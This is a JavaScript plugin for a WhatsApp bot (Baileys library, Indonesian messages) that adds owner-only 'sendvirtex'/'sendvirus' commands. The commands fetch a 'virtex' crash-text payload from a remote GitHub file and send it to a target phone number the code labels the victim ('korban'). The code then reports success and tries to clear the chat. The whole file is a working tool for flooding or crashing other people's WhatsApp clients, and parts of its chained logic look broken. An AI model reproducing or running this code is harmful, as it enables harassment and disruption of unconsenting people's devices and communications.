let axios = require("axios");
const { MessageType } = require('@adiwajshing/baileys')

let handler = async(m, { conn, text }) => {
let [number, pesan] = text.split `|`

    if (!number) return conn.reply(m.chat, 'Silahkan masukan nomor yang akan dikirim virtex', m)
    axios.get(`https://raw.githubusercontent.com/saipulanuar/Api-Github/main/virus/virtex1.json`).then ((res) => {

let info = `
*JANGAN LUPA SUBSCRIBEx*

${res.data}
`.trim()
    if (text.startsWith('+')) return conn.reply(m.chat, '[!] Tolong masukan Nomor dengan awalaan 62', m)
    if (text.startsWith('@')) return conn.reply(m.chat, '[!] Tolong masukan Nomor dengan awalaan 62', m)

    let korban = `${number}`
    var nomor = m.sender
    let virtex = `*「 DAPAT PESAN 」*\n\nDari : wa.me/${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${info}\n\n*~VIRTEX BY: KING OF BEAR*`

    conn.sendMessage(korban + '@s.whatsapp.net', virtex, MessageType.text)

    let logs = `[!] Berhasil mengirim virtex ke nomor ${korban}`
    conn.reply(m.chat, logs, m)
    }).then(v => conn.modifyChat(v.key.remoteJid, 'clear'))
}
handler.help = ['sendvirtex <nomor>', 'sendvirus <nomor>']
handler.tags = ['virus']
handler.command = /^(sendvirtex|sendvirus)$/i
handler.owner = true
handler.mods = false
handler.premium = false
handler.group = false
handler.private = false
handler.disable = false // klo pake wa mod ubah aja ke false

handler.admin = false
handler.botAdmin = false

handler.fail = null
handler.limit = false

module.exports = handler
